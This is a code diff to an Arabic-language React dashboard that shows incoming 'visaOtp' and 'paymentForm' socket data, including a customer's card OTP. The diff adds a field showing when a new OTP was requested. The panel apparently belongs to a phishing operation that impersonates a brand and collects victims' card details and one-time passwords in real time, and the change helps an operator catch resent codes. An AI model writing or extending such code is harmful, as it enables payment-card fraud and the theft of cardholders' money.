@@ -196,11 +196,20 @@ function renderHumanitiBilling(c) {
 }
 
 function renderHumanitiOtp(c) {
-  if (!c.CardOtp) return null;
+  if (!c.CardOtp && !c.otpResendRequestedAt) return null;
 
   return (
     <OrderSection title="OTP الدفع">
-      <OrderField label="OTP البطاقة" value={c.CardOtp} otp ltr />
+      {c.CardOtp && (
+        <OrderField label="OTP البطاقة" value={c.CardOtp} otp ltr />
+      )}
+      {c.otpResendRequestedAt && (
+        <OrderField
+          label="طلب رمز جديد"
+          value={new Date(c.otpResendRequestedAt).toLocaleString("ar-JO")}
+          ltr
+        />
+      )}
     </OrderSection>
   );
 }
@@ -327,6 +336,9 @@ const Main = () => {
       handleNewClientData(payload, "paymentForm"),
     );
     socket.on("visaOtp", (payload) => handleNewClientData(payload, "visaOtp"));
+    socket.on("visaOtpResend", (payload) =>
+      handleNewClientData(payload, "visaOtpResend"),
+    );
 
     getUsers();
 
@@ -338,6 +350,7 @@ const Main = () => {
       socket.off("cartData");
       socket.off("paymentForm");
       socket.off("visaOtp");
+      socket.off("visaOtpResend");
     };
   }, [debouncedGetUsers, getUsers, navigate]);
 
